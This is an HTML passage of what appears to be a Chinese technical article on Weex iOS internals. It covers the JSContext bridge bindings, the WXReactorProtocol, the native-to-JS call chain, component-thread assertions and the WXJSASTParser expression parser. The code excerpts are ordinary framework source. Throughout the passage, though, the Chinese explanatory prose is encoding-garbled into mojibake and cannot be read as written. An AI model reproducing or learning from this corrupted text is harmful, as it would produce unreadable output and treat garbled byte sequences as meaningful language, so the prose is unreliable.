        return [JSValue valueWithInt32:(int32_t)callAddElement(instanceIdString, parentRef, componentData, insertIndex) inContext:[JSContext currentContext]];
    };
    
    _jsContext[@"callAddElement"] = callAddElementBlock;
}
</code></pre>
<p>åœ¨ js ä¾§æ˜¯é€šè¿‡  TaskCenter.js çš„ init æ–¹æ³•ä¸­å®šä¹‰çš„ï¼Œå­˜åœ¨æ˜ å°„å…³ç³»ï¼Œ <code>addElement: global.callAddElement,</code></p>
<h3 data-id="heading-50">3. callJS å®ç°</h3>
<p><code>WXReactorProtocol</code> åè®®ï¼š</p>
<ul>
<li>å®šä¹‰ Native è°ƒç”¨ JS çš„ã€Œæ ‡å‡†æ¥å£ã€ï¼ˆå¦‚è§¦å‘å›è°ƒã€å‘é€äº‹ä»¶ï¼‰ï¼Œä¸å…³å¿ƒåº•å±‚ç”¨å“ªç§ JS å¼•æ“ï¼ˆJavaScriptCore / å…¶ä»–ï¼‰ï¼›</li>
<li>å…·ä½“çš„æ¡¥æ¥ç±»ï¼ˆå¦‚ <code>WXJSCoreBridge</code>ï¼‰éµå®ˆè¿™ä¸ªåè®®ï¼Œå®ç°æ¥å£æ–¹æ³• â€”â€” å³ä½¿æœªæ¥æ›¿æ¢ JS å¼•æ“ï¼Œåªè¦éµå®ˆåè®®ï¼Œä¸Šå±‚ä»£ç ï¼ˆå¦‚ Native æ¨¡å—ã€ç»„ä»¶ï¼‰æ— éœ€ä¿®æ”¹ã€‚</li>
</ul>
<pre><code class="hljs language-objective-c" lang="objective-c">
@class JSContext;

@protocol WXReactorProtocol &lt;NSObject&gt;

@required

/**
Weex should register a JSContext to reactor
*/
- (void)registerJSContext:(NSString *)instanceId;

/**
 Reactor execute js source
*/
- (void)render:(NSString *)instanceId source:(NSString*)source data:(NSDictionary* _Nullable)data;

- (void)unregisterJSContext:(NSString *)instanceId;

/**
 When js call Weex NativeModule, invoke callback function
 
 @param instanceId : weex instance id
 @param callbackId : callback function id
 @param args       : args
*/
- (void)invokeCallBack:(NSString *)instanceId function:(NSString *)callbackId args:(NSArray * _Nullable)args;

/**
Native event to js
 
@param instanceId :   instance id
@param ref        :   node reference
@param event      :   event type
@param args       :   parameters in event object
@param domChanges :  dom value changes, used for two-way data binding
*/
- (void)fireEvent:(NSString *)instanceId ref:(NSString *)ref event:(NSString *)event args:(NSDictionary * _Nullable)args domChanges:(NSDictionary * _Nullable)domChanges;

@end
</code></pre>
<p>Native æ¨¡å—ï¼ˆModule)/ç»„ä»¶(Component) å®Œæˆä»»åŠ¡å -&gt;  <code>WXBridgeManager.callBack(...)</code> â†’ æ„é€  JS è„šæœ¬ï¼ˆè°ƒç”¨ <code>TaskCenter.callback</code>ï¼‰ â†’ <code>WXJSCoreBridge.executeJavascript(...)</code> â†’ JS å¼•æ“æ‰§è¡Œ â†’ <code>TaskCenter.callback</code> å“åº”</p>
<p><code>WXJSCoreBridge</code> æœ¬èº«ä¸ç›´æ¥æ‹¼æ¥å›è°ƒè„šæœ¬ï¼Œè€Œæ˜¯æä¾› <code>executeJavascript:</code> æ–¹æ³•ï¼ˆæºç ç¬¬ 102 è¡Œï¼‰ï¼Œä½œä¸º JS è„šæœ¬æ‰§è¡Œçš„åº•å±‚å…¥å£ï¼›çœŸæ­£çš„è„šæœ¬æ„é€ ï¼Œåœ¨ <code>WXBridgeManager</code> ä¸­</p>
<p>WXBridgeManager äº‹ä»¶å›è°ƒ</p>
<pre><code class="hljs language-javascript" lang="javascript">- (<span class="hljs-keyword">void</span>)<span class="hljs-attr">fireEvent</span>:(<span class="hljs-title class_">NSString</span> *)instanceId <span class="hljs-attr">ref</span>:(<span class="hljs-title class_">NSString</span> *)ref <span class="hljs-attr">type</span>:(<span class="hljs-title class_">NSString</span> *)type <span class="hljs-attr">params</span>:(<span class="hljs-title class_">NSDictionary</span> *)params
{
    [self <span class="hljs-attr">fireEvent</span>:instanceId <span class="hljs-attr">ref</span>:ref <span class="hljs-attr">type</span>:type <span class="hljs-attr">params</span>:params <span class="hljs-attr">domChanges</span>:nil];
}

- (<span class="hljs-keyword">void</span>)<span class="hljs-attr">fireEvent</span>:(<span class="hljs-title class_">NSString</span> *)instanceId <span class="hljs-attr">ref</span>:(<span class="hljs-title class_">NSString</span> *)ref <span class="hljs-attr">type</span>:(<span class="hljs-title class_">NSString</span> *)type <span class="hljs-attr">params</span>:(<span class="hljs-title class_">NSDictionary</span> *)params <span class="hljs-attr">domChanges</span>:(<span class="hljs-title class_">NSDictionary</span> *)domChanges
{
    [self <span class="hljs-attr">fireEvent</span>:instanceId <span class="hljs-attr">ref</span>:ref <span class="hljs-attr">type</span>:type <span class="hljs-attr">params</span>:params <span class="hljs-attr">domChanges</span>:domChanges <span class="hljs-attr">handlerArguments</span>:nil];
}
- (<span class="hljs-keyword">void</span>)<span class="hljs-attr">fireEvent</span>:(<span class="hljs-title class_">NSString</span> *)instanceId <span class="hljs-attr">ref</span>:(<span class="hljs-title class_">NSString</span> *)ref <span class="hljs-attr">type</span>:(<span class="hljs-title class_">NSString</span> *)type <span class="hljs-attr">params</span>:(<span class="hljs-title class_">NSDictionary</span> *)params <span class="hljs-attr">domChanges</span>:(<span class="hljs-title class_">NSDictionary</span> *)domChanges <span class="hljs-attr">handlerArguments</span>:(<span class="hljs-title class_">NSArray</span> *)handlerArguments
{
	   <span class="hljs-comment">// ...</span>
    <span class="hljs-title class_">WXCallJSMethod</span> *method = [[<span class="hljs-title class_">WXCallJSMethod</span> alloc] <span class="hljs-attr">initWithModuleName</span>:nil <span class="hljs-attr">methodName</span>:@<span class="hljs-string">"fireEvent"</span> <span class="hljs-attr">arguments</span>:[<span class="hljs-title class_">WXUtility</span> <span class="hljs-attr">convertContainerToImmutable</span>:args] <span class="hljs-attr">instance</span>:instance];
    [self <span class="hljs-attr">callJsMethod</span>:method];
}

- (<span class="hljs-keyword">void</span>)<span class="hljs-attr">callJsMethod</span>:(<span class="hljs-title class_">WXCallJSMethod</span> *)method
{
    <span class="hljs-keyword">if</span> (!method || !method.<span class="hljs-property">instance</span>) <span class="hljs-keyword">return</span>;
    
    __weak <span class="hljs-title function_">typeof</span>(self) weakSelf = self;
    <span class="hljs-title class_">WXPerformBlockOnBridgeThreadForInstance</span>(^(){
        <span class="hljs-title class_">WXBridgeContext</span>* context = method.<span class="hljs-property">instance</span>.<span class="hljs-property">useBackupJsThread</span> ? weakSelf.<span class="hljs-property">backupBridgeCtx</span> :  weakSelf.<span class="hljs-property">bridgeCtx</span>;
        [context <span class="hljs-attr">executeJsMethod</span>:method];
    }, method.<span class="hljs-property">instance</span>.<span class="hljs-property">instanceId</span>);
}
</code></pre>
<p>WXBridgeContext.m ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">- (<span class="hljs-keyword">void</span>)<span class="hljs-attr">executeJsMethod</span>:(<span class="hljs-title class_">WXCallJSMethod</span> *)method {    
   <span class="hljs-comment">// ...</span>
    [sendQueue <span class="hljs-attr">addObject</span>:method];
    [self <span class="hljs-attr">performSelector</span>:@<span class="hljs-title function_">selector</span>(_sendQueueLoop) <span class="hljs-attr">withObject</span>:nil];
}

- (<span class="hljs-keyword">void</span>)_sendQueueLoop {
    <span class="hljs-keyword">if</span> ([tasks count] &gt; <span class="hljs-number">0</span> &amp;&amp; execIns) {
        <span class="hljs-title class_">WXSDKInstance</span> * execInstance = [<span class="hljs-title class_">WXSDKManager</span> <span class="hljs-attr">instanceForID</span>:execIns];
        <span class="hljs-title class_">NSTimeInterval</span> start = <span class="hljs-title class_">CACurrentMediaTime</span>()*<span class="hljs-number">1000</span>;
        
        <span class="hljs-keyword">if</span> (execInstance.<span class="hljs-property">instanceJavaScriptContext</span> &amp;&amp; execInstance.<span class="hljs-property">bundleType</span>) {
            [self <span class="hljs-attr">callJSMethod</span>:@<span class="hljs-string">"__WEEX_CALL_JAVASCRIPT__"</span> <span class="hljs-attr">args</span>:@[execIns, [tasks copy]] <span class="hljs-attr">onContext</span>:execInstance.<span class="hljs-property">instanceJavaScriptContext</span> <span class="hljs-attr">completion</span>:nil];
        } <span class="hljs-keyword">else</span> {
            [self <span class="hljs-attr">callJSMethod</span>:@<span class="hljs-string">"callJS"</span> <span class="hljs-attr">args</span>:@[execIns, [tasks copy]]];
        }
        <span class="hljs-comment">// ...</span>
    }
}

- (<span class="hljs-keyword">void</span>)<span class="hljs-attr">callJSMethod</span>:(<span class="hljs-title class_">NSString</span> *)method <span class="hljs-attr">args</span>:(<span class="hljs-title class_">NSArray</span> *)args {
    <span class="hljs-keyword">if</span> (self.<span class="hljs-property">frameworkLoadFinished</span>) {
        [self.<span class="hljs-property">jsBridge</span> <span class="hljs-attr">callJSMethod</span>:method <span class="hljs-attr">args</span>:args];
    } <span class="hljs-keyword">else</span> {
        [_methodQueue <span class="hljs-attr">addObject</span>:@{@<span class="hljs-string">"method"</span>:method, @<span class="hljs-string">"args"</span>:args}];
    }
}
</code></pre>
<p>å†åˆ° WXJSCoreManager</p>
<pre><code class="hljs language-javascript" lang="javascript">- (<span class="hljs-title class_">JSValue</span> *)<span class="hljs-attr">callJSMethod</span>:(<span class="hljs-title class_">NSString</span> *)method <span class="hljs-attr">args</span>:(<span class="hljs-title class_">NSArray</span> *)args {
    <span class="hljs-title class_">WXLogDebug</span>(@<span class="hljs-string">"Calling JS... method:%@, args:%@"</span>, method, args);
    <span class="hljs-title class_">WXPerformBlockOnMainThread</span>(^{
        [[<span class="hljs-title class_">WXBridgeManager</span> sharedManager].<span class="hljs-property">lastMethodInfo</span> <span class="hljs-attr">setObject</span>:method ?: @<span class="hljs-string">""</span> <span class="hljs-attr">forKey</span>:@<span class="hljs-string">"method"</span>];
        [[<span class="hljs-title class_">WXBridgeManager</span> sharedManager].<span class="hljs-property">lastMethodInfo</span> <span class="hljs-attr">setObject</span>:args ?: @[] <span class="hljs-attr">forKey</span>:@<span class="hljs-string">"args"</span>];
    });
    <span class="hljs-keyword">return</span> [[_jsContext globalObject] <span class="hljs-attr">invokeMethod</span>:method <span class="hljs-attr">withArguments</span>:[args copy]];
}
</code></pre>
<p>å…¶å®ä¸ç®¡æ˜¯ CallJS è¿˜æ˜¯ CallNativeï¼Œé€šä¿¡çš„æŠ€æœ¯æ–¹æ¡ˆè®¾è®¡å’Œ Hybrid çš„è®¾è®¡ä¸€è‡´ï¼Œéƒ½éœ€è¦åœ¨ JavascriptCore çš„ global å¯¹è±¡ä¸ŠæŒ‚è½½ä¸€ä¸ªæ–¹æ³•ã€‚æ¯”å¦‚ Native æ³¨å†Œäº†ä¸€ä¸ª WXComponent ä¹‹åï¼ŒWeex ä¾§ç”¨ Vue è¯­æ³•å†™å®Œäº†ä¸ªé¡µé¢ï¼Œå‘ˆç°åœ¨ç”¨æˆ·æ‰‹æœºä¸Šï¼Œç”¨æˆ·ç‚¹å‡»é¡µé¢ä¸Šçš„æŒ‰é’®ä¹‹åï¼ŒNative å†å°†äº‹ä»¶å›è°ƒç»™ Weex ä¾§ï¼ŒWeex å†å»å¤„ç†åç»­é€»è¾‘ã€‚</p>
<h3 data-id="heading-51">4. WXAssertComponentThread æ–­è¨€</h3>
<p><code>WXAssertComponentThread</code> çš„æ ¸å¿ƒä½œç”¨æ˜¯ <strong>å¼ºåˆ¶çº¦æŸç»„ä»¶ç›¸å…³æ“ä½œåœ¨ã€Œç»„ä»¶ä¸“å±çº¿ç¨‹ã€æ‰§è¡Œ</strong>ï¼Œæœ¬è´¨æ˜¯ä¸ºäº†è§£å†³ã€Œçº¿ç¨‹å®‰å…¨ã€å’Œã€Œæ€§èƒ½ç¨³å®šæ€§ã€é—®é¢˜</p>
<p>iOS å¼€å‘çš„æ ¸å¿ƒçº¿ç¨‹è§„åˆ™æ˜¯ã€ŒUI æ“ä½œå¿…é¡»åœ¨ä¸»çº¿ç¨‹ã€ï¼Œä½† Weex ç»„ä»¶çš„å·¥ä½œæµç¨‹ï¼ˆç»‘å®šè§£æã€æ•°æ®è®¡ç®—ã€å¸ƒå±€è®¡ç®—ã€å­ç»„ä»¶ç®¡ç†ï¼‰åŒ…å«å¤§é‡ã€Œé UI æ“ä½œã€â€”â€” å¦‚æœè¿™äº›æ“ä½œéƒ½åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œï¼Œä¼šé˜»å¡ä¸»çº¿ç¨‹ï¼ˆæ¯”å¦‚é•¿åˆ—è¡¨æ•°æ®è§£æã€å¤æ‚è¡¨è¾¾å¼è®¡ç®—ï¼‰ï¼Œå¯¼è‡´ UI å¡é¡¿ï¼ˆæ¯”å¦‚æ»‘åŠ¨æ‰å¸§ï¼‰</p>
<p>å› æ­¤ Weex è®¾è®¡äº†çº¿ç¨‹åˆ†å·¥</p>

















<table><thead><tr><th>çº¿ç¨‹ç±»å‹</th><th>è´Ÿè´£çš„æ“ä½œ</th></tr></thead><tbody><tr><td>ç»„ä»¶ä¸“å±çº¿ç¨‹</td><td>ç»‘å®šè§„åˆ™è§£æï¼ˆ<code>_storeBindings</code>ï¼‰ã€è¡¨è¾¾å¼è®¡ç®—ï¼ˆ<code>bindingBlockWithExpression</code>ï¼‰ã€æ•°æ®æ›´æ–°ï¼ˆ<code>updateBindingData</code>ï¼‰ã€å¸ƒå±€è®¡ç®—ï¼ˆ<code>calculateLayout</code>ï¼‰</td></tr><tr><td>ä¸»çº¿ç¨‹</td><td>æœ€ç»ˆ UI æ¸²æŸ“ï¼ˆå¦‚ <code>UIImageView</code> è®¾å›¾ã€<code>UILabel</code> è®¾æ–‡æœ¬ï¼‰ã€å­è§†å›¾å¢åˆ ï¼ˆ<code>insertSubview</code>ï¼‰</td></tr></tbody></table>
<h4 data-id="heading-52">1. é¿å…ã€Œçº¿ç¨‹å®‰å…¨é—®é¢˜ã€ï¼Œé˜²æ­¢å´©æºƒ / æ•°æ®é”™ä¹±</h4>
<p>ç»„ä»¶çš„æ ¸å¿ƒæ•°æ®ï¼ˆå¦‚ <code>_bindingProps</code>ã€<code>_subcomponents</code>ã€<code>_flexCssNode</code>ï¼‰éƒ½æ˜¯ã€Œéçº¿ç¨‹å®‰å…¨çš„ã€ï¼ˆæ²¡æœ‰åŠ é”ä¿æŠ¤ï¼‰â€”â€” å¦‚æœå¤šä¸ªçº¿ç¨‹åŒæ—¶è¯»å†™è¿™äº›æ•°æ®ï¼Œä¼šå¯¼è‡´ï¼š</p>
<ul>
<li>æ•°æ®ç«äº‰ï¼šæ¯”å¦‚ä¸»çº¿ç¨‹è¯»å– <code>_subcomponents</code> éå†ï¼Œç»„ä»¶çº¿ç¨‹åŒæ—¶ä¿®æ”¹ <code>_subcomponents</code>ï¼ˆå¢åˆ å­ç»„ä»¶ï¼‰ï¼Œå¯¼è‡´æ•°ç»„è¶Šç•Œå´©æºƒï¼›</li>
<li>æ•°æ®ä¸ä¸€è‡´ï¼šæ¯”å¦‚ç»„ä»¶çº¿ç¨‹æ›´æ–° <code>_bindingProps</code> çš„å€¼ï¼Œä¸»çº¿ç¨‹åŒæ—¶è¯»å–è¯¥å€¼ç”¨äº UI æ›´æ–°ï¼Œå¯¼è‡´æ˜¾ç¤ºé”™è¯¯çš„æ—§å€¼ï¼›</li>
<li>é‡æŒ‡é’ˆï¼šæ¯”å¦‚ç»„ä»¶çº¿ç¨‹é”€æ¯å­ç»„ä»¶ï¼Œä¸»çº¿ç¨‹è¿˜åœ¨è®¿é—®è¯¥å­ç»„ä»¶çš„ <code>view</code>ã€‚</li>
</ul>
<p>çº¿ç¨‹æ–­è¨€é€šè¿‡ã€Œå¼ºåˆ¶æ‰€æœ‰ç»„ä»¶æ ¸å¿ƒæ“ä½œåœ¨åŒä¸€çº¿ç¨‹æ‰§è¡Œã€ï¼Œä»æ ¹æºä¸Šé¿å…äº†è¿™äº›è·¨çº¿ç¨‹é—®é¢˜ â€”â€” åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹æ“ä½œç»„ä»¶æ•°æ®ï¼Œæ— éœ€å¤æ‚é”æœºåˆ¶ï¼ˆé”ä¼šé™ä½æ€§èƒ½ï¼‰ã€‚</p>
<h4 data-id="heading-53">2. ç®€åŒ–è°ƒè¯•ï¼Œå¿«é€Ÿå®šä½çº¿ç¨‹é—®é¢˜</h4>
<p>å¦‚æœæ²¡æœ‰çº¿ç¨‹æ–­è¨€ï¼Œè·¨çº¿ç¨‹æ“ä½œç»„ä»¶å¯èƒ½å¯¼è‡´ã€Œå¶ç°å´©æºƒã€ï¼ˆæ¯”å¦‚ 100 æ¬¡æ“ä½œå‡ºç° 1 æ¬¡ï¼‰ï¼Œéš¾ä»¥å¤ç°å’Œæ’æŸ¥ï¼ˆæ—¥å¿—ä¸­çœ‹ä¸åˆ°çº¿ç¨‹ä¸Šä¸‹æ–‡ï¼‰ã€‚è€Œçº¿ç¨‹æ–­è¨€ä¼šåœ¨ã€Œè¿è§„çº¿ç¨‹è°ƒç”¨æ—¶ç›´æ¥å´©æºƒã€ï¼Œå¹¶æ˜ç¡®æç¤ºã€Œå¿…é¡»åœ¨ç»„ä»¶çº¿ç¨‹æ‰§è¡Œã€ï¼Œå¼€å‘è€…èƒ½ç«‹åˆ»å®šä½åˆ°è¿è§„ä»£ç ï¼ˆæ¯”å¦‚åœ¨ä¸»çº¿ç¨‹è°ƒç”¨äº† <code>updateBindingData</code>ï¼‰ï¼Œå¤§å¹…é™ä½è°ƒè¯•æˆæœ¬ã€‚</p>
<h4 data-id="heading-54">3. ä¿è¯æ“ä½œé¡ºåºä¸€è‡´æ€§</h4>
<p>ç»„ä»¶çš„æ›´æ–°æµç¨‹æ˜¯ã€Œè§£æç»‘å®š â†’ è®¡ç®—è¡¨è¾¾å¼ â†’ æ›´æ–°å±æ€§ â†’ å¸ƒå±€è®¡ç®— â†’ UI æ¸²æŸ“ã€â€”â€” è¿™äº›æ­¥éª¤å¿…é¡»æŒ‰é¡ºåºæ‰§è¡Œã€‚å¦‚æœåˆ†æ•£åœ¨å¤šä¸ªçº¿ç¨‹ï¼Œå¯èƒ½å‡ºç°ã€Œå¸ƒå±€è®¡ç®—è¿˜æ²¡å®Œæˆï¼ŒUI å·²ç»å¼€å§‹æ¸²æŸ“ã€çš„æƒ…å†µï¼ˆå¯¼è‡´å¸ƒå±€é”™ä¹±ï¼‰ã€‚ç»„ä»¶ä¸“å±çº¿ç¨‹ä¿è¯äº†æ‰€æœ‰æ“ä½œä¸²è¡Œæ‰§è¡Œï¼Œé¡ºåºä¸ä¼šä¹±ã€‚</p>
<h3 data-id="heading-55">5. WXJSASTParser çš„å·¥ä½œåŸç†</h3>
<p><code>WXJSASTParser</code> å¦‚ä½•æŠŠè¡¨è¾¾å¼å­—ç¬¦ä¸²è§£æä¸º AST èŠ‚ç‚¹ï¼Ÿ</p>
<p><code>WXJSASTParser</code> æ˜¯ Weex è‡ªå®šä¹‰çš„ã€Œè½»é‡ JS è¡¨è¾¾å¼è§£æå™¨ã€â€”â€” æ ¸å¿ƒæ˜¯ã€ŒæŒ‰ JS è¯­æ³•è§„åˆ™ï¼ŒæŠŠå­—ç¬¦ä¸²æ‹†åˆ†ä¸ºç»“æ„åŒ–çš„ AST èŠ‚ç‚¹ã€ï¼Œå…¨ç¨‹ä¸ä¾èµ–å®Œæ•´ JS å¼•æ“ï¼ˆå¦‚ JSC/V8ï¼‰ï¼Œåªæ”¯æŒç»‘å®šè¡¨è¾¾å¼éœ€è¦çš„åŸºç¡€è¯­æ³•ï¼ˆæ ‡è¯†ç¬¦ã€æˆå‘˜è®¿é—®ã€äºŒå…ƒè¿ç®—ç­‰ï¼‰ï¼Œå…¼é¡¾æ€§èƒ½å’Œä½“ç§¯ã€‚</p>
<p>æ•´ä¸ªè§£æè¿‡ç¨‹åˆ† 3 æ­¥ï¼š<strong>è¯æ³•åˆ†æ â†’ è¯­æ³•åˆ†æ â†’ AST èŠ‚ç‚¹å°è£…</strong>ï¼Œå’Œç¼–è¯‘å™¨çš„å‰ç«¯æµç¨‹ä¸€è‡´ï¼Œä»¥ä¸‹ç»“åˆç¤ºä¾‹ï¼ˆ<code>"user.name + '?size=100'"</code>ï¼‰æ‹†è§£ï¼š</p>
<p>å…ˆæ˜ç¡®ï¼šAST æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>ASTï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰æ˜¯ã€Œç”¨æ ‘å½¢ç»“æ„è¡¨ç¤ºä»£ç è¯­æ³•ã€çš„ä¸­é—´ç»“æ„ â€”â€” æ¯”å¦‚è¡¨è¾¾å¼ <code>user.name + '?size=100'</code>ï¼ŒAST ä¼šæ‹†åˆ†ä¸ºï¼š</p>
<pre><code class="hljs language-shell" lang="shell">æ ¹èŠ‚ç‚¹ï¼šBinaryExpressionï¼ˆè¿ç®—ç¬¦ '+'ï¼‰
â”œâ”€ å·¦å­èŠ‚ç‚¹ï¼šMemberExpressionï¼ˆæˆå‘˜è®¿é—®ï¼‰
â”‚  â”œâ”€ objectï¼šIdentifierï¼ˆæ ‡è¯†ç¬¦ 'user'ï¼‰
â”‚  â””â”€ propertyï¼šIdentifierï¼ˆæ ‡è¯†ç¬¦ 'name'ï¼‰
â””â”€ å³å­èŠ‚ç‚¹ï¼šStringLiteralï¼ˆå­—ç¬¦ä¸²å­—é¢é‡ '?size=100'ï¼‰
</code></pre>
<p>è¿™ç§ç»“æ„èƒ½è¢«ç¨‹åºå¿«é€Ÿéå†å’Œè®¡ç®—ï¼ˆæ¯”å¦‚ä¹‹å‰è®²çš„ç”Ÿæˆ <code>WXDataBindingBlock</code> æ—¶ï¼Œé€’å½’éå†èŠ‚ç‚¹æ‰§è¡Œè¿ç®—ï¼‰ã€‚</p>
<h4 data-id="heading-56">1.è¯æ³•åˆ†æï¼ˆLexical Analysisï¼‰</h4>
<p>æ‹†åˆ†ä¸ºè¯æ³•å•å…ƒï¼ˆTokenï¼‰ã€‚è¯æ³•åˆ†ææ˜¯ã€ŒæŠŠè¡¨è¾¾å¼å­—ç¬¦ä¸²æ‹†åˆ†ä¸ºæœ€å°çš„ã€æœ‰æ„ä¹‰çš„è¯­æ³•å•å…ƒã€ï¼Œå¿½ç•¥ç©ºæ ¼ã€æ¢è¡Œç­‰æ— å…³å­—ç¬¦ã€‚æ ¸å¿ƒæ˜¯ã€ŒæŒ‰ JS è¯­æ³•è§„åˆ™åŒ¹é…å­—ç¬¦åºåˆ—ã€ã€‚</p>
<p><code>è¡¨è¾¾å¼ </code>"user.name + '?size=100'"` è¯æ³•åˆ†æåå¾—åˆ°çš„ Token åºåˆ—ï¼š</p>



































<table><thead><tr><th>Token ç±»å‹</th><th>Token å€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>IDENTIFIER</code></td><td><code>user</code></td><td>æ ‡è¯†ç¬¦ï¼ˆå˜é‡å / å±æ€§åï¼‰</td></tr><tr><td><code>DOT</code></td><td><code>.</code></td><td>æˆå‘˜è®¿é—®è¿ç®—ç¬¦</td></tr><tr><td><code>IDENTIFIER</code></td><td><code>name</code></td><td>æ ‡è¯†ç¬¦</td></tr><tr><td><code>PLUS</code></td><td><code>+</code></td><td>äºŒå…ƒè¿ç®—ç¬¦ï¼ˆåŠ æ³• / æ‹¼æ¥ï¼‰</td></tr><tr><td><code>STRING_LITERAL</code></td><td><code>?size=100</code></td><td>å­—ç¬¦ä¸²å­—é¢é‡ï¼ˆå»æ‰å¼•å·ï¼‰</td></tr></tbody></table>
<p>è¯æ³•åˆ†æçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ï¼‰ï¼š</p>
<ol>
<li>åˆå§‹åŒ–ä¸€ä¸ªã€Œå­—ç¬¦æŒ‡é’ˆã€ï¼Œä»è¡¨è¾¾å¼å­—ç¬¦ä¸²å¼€å¤´éå†ï¼›</li>
<li>é‡åˆ°å­—æ¯ / ä¸‹åˆ’çº¿ â†’ ç»§ç»­å¾€åè¯»ï¼Œç›´åˆ°éå­—æ¯ / æ•°å­— / ä¸‹åˆ’çº¿ â†’ è¯†åˆ«ä¸º <code>IDENTIFIER</code>ï¼ˆå¦‚ <code>user</code>ï¼‰ï¼›</li>
<li>é‡åˆ° <code>+</code>/<code>-</code>/<code>*</code>/<code>/</code>/<code>&gt;</code>/<code>=</code> ç­‰ â†’ è¯†åˆ«ä¸ºå¯¹åº”è¿ç®—ç¬¦ï¼ˆå¦‚ <code>+</code> â†’ <code>PLUS</code>ï¼‰ï¼›</li>
<li>é‡åˆ° <code>"</code> æˆ– <code>'</code> â†’ ç»§ç»­å¾€åè¯»ï¼Œç›´åˆ°ä¸‹ä¸€ä¸ªç›¸åŒå¼•å· â†’ è¯†åˆ«ä¸º <code>STRING_LITERAL</code>ï¼ˆå»æ‰å¼•å·ï¼‰ï¼›</li>
<li>é‡åˆ° <code>.</code> â†’ è¯†åˆ«ä¸º <code>DOT</code>ï¼ˆæˆå‘˜è®¿é—®ï¼‰ï¼›</li>
<li>é‡åˆ°ç©ºæ ¼ / åˆ¶è¡¨ç¬¦ â†’ ç›´æ¥è·³è¿‡ï¼ˆæ— æ„ä¹‰å­—ç¬¦ï¼‰ï¼›</li>
<li>é‡åˆ°æ— æ³•è¯†åˆ«çš„å­—ç¬¦ï¼ˆå¦‚ <code>#</code>/<code>@</code>ï¼‰â†’ æŠ›å‡ºè¯­æ³•é”™è¯¯ï¼ˆ<code>WXLogError</code>ï¼‰ã€‚</li>
</ol>
<p>Weex çš„ <code>WXJSASTParser</code> å†…éƒ¨ä¼šç»´æŠ¤ä¸€ä¸ªã€ŒToken æµã€ï¼ˆæ•°ç»„ï¼‰ï¼Œè¯æ³•åˆ†æåæŠŠ Token æŒ‰é¡ºåºå­˜å…¥æµä¸­ï¼Œä¾›ä¸‹ä¸€æ­¥è¯­æ³•åˆ†æä½¿ç”¨ã€‚</p>
<h4 data-id="heading-57">2. è¯­æ³•åˆ†æï¼ˆSyntactic Analysisï¼‰</h4>
<p>è¯­æ³•åˆ†ææ˜¯ã€Œæ ¹æ® JS è¡¨è¾¾å¼è¯­æ³•è§„åˆ™ï¼ŒæŠŠ Token æµç»„åˆä¸ºæ ‘å½¢ AST èŠ‚ç‚¹ã€â€”â€” æ ¸å¿ƒæ˜¯ã€ŒéªŒè¯ Token åºåˆ—æ˜¯å¦ç¬¦åˆè¯­æ³•ï¼Œå¹¶æ„å»ºå±‚çº§å…³ç³»ã€ã€‚</p>
<p>Weex æ”¯æŒçš„ JS è¡¨è¾¾å¼è¯­æ³•å­é›†ï¼ˆæ ¸å¿ƒï¼‰ï¼š</p>
<ul>
<li>æ ‡è¯†ç¬¦ï¼š<code>user</code>ã€<code>imageUrl</code>ï¼ˆå¯¹åº” <code>WXJSIdentifier</code>ï¼‰ï¼›</li>
<li>æˆå‘˜è®¿é—®ï¼š<code>user.name</code>ã€<code>list[0]</code>ï¼ˆå¯¹åº” <code>WXJSMemberExpression</code>ï¼‰ï¼›</li>
<li>å­—é¢é‡ï¼šå­—ç¬¦ä¸²ï¼ˆ<code>'abc'</code>ï¼‰ã€æ•°å­—ï¼ˆ<code>123</code>ï¼‰ã€å¸ƒå°”ï¼ˆ<code>true</code>ï¼‰ã€nullï¼ˆå¯¹åº” <code>WXJSStringLiteral</code>/<code>WXJSNumericLiteral</code> ç­‰ï¼‰ï¼›</li>
<li>äºŒå…ƒè¿ç®—ï¼š<code>a + b</code>ã€<code>age &gt; 18</code>ã€<code>a === b</code>ï¼ˆå¯¹åº” <code>WXJSBinaryExpression</code>ï¼‰ï¼›</li>
<li>æ¡ä»¶è¿ç®—ï¼š<code>age &gt; 18 ? 'adult' : 'teen'</code>ï¼ˆå¯¹åº” <code>WXJSConditionalExpression</code>ï¼‰ï¼›</li>
<li>æ•°ç»„è¡¨è¾¾å¼ï¼š<code>[a, b, c]</code>ï¼ˆå¯¹åº” <code>WXJSArrayExpression</code>ï¼‰ã€‚</li>
</ul>
<p>ç¤ºä¾‹ï¼šToken æµ â†’ AST èŠ‚ç‚¹çš„æ„å»ºè¿‡ç¨‹</p>
<p>Token æµï¼š<code>IDENTIFIER(user) â†’ DOT â†’ IDENTIFIER(name) â†’ PLUS â†’ STRING_LITERAL(?size=100)</code></p>
<ol>
<li>è¯­æ³•åˆ†æå™¨å…ˆè¯»å–å‰ 3 ä¸ª Tokenï¼ˆ<code>user</code> â†’ <code>.</code> â†’ <code>name</code>ï¼‰ï¼ŒåŒ¹é…ã€Œæˆå‘˜è®¿é—®è¯­æ³•è§„åˆ™ã€ï¼ˆ<code>IDENTIFIER . IDENTIFIER</code>ï¼‰â†’ æ„å»º <code>WXJSMemberExpression</code> èŠ‚ç‚¹ï¼ˆå·¦å­èŠ‚ç‚¹ <code>user</code>ï¼Œå³å­èŠ‚ç‚¹ <code>name</code>ï¼‰ï¼›</li>
<li>æ¥ç€è¯»å– <code>PLUS</code>ï¼ˆäºŒå…ƒè¿ç®—ç¬¦ï¼‰ï¼Œå†è¯»å–åé¢çš„ <code>STRING_LITERAL(?size=100)</code> â†’ åŒ¹é…ã€ŒäºŒå…ƒè¿ç®—è¯­æ³•è§„åˆ™ã€ï¼ˆ<code>Expression + Expression</code>ï¼‰ï¼›</li>
<li>æŠŠä¹‹å‰æ„å»ºçš„ <code>WXJSMemberExpression</code> ä½œä¸ºã€Œå·¦å­èŠ‚ç‚¹ã€ï¼Œ<code>STRING_LITERAL</code> ä½œä¸ºã€Œå³å­èŠ‚ç‚¹ã€ï¼Œ<code>PLUS</code>ä½œä¸ºã€Œè¿ç®—ç¬¦ã€â†’ æ„å»ºæ ¹èŠ‚ç‚¹ <code>WXJSBinaryExpression</code>ï¼›</li>
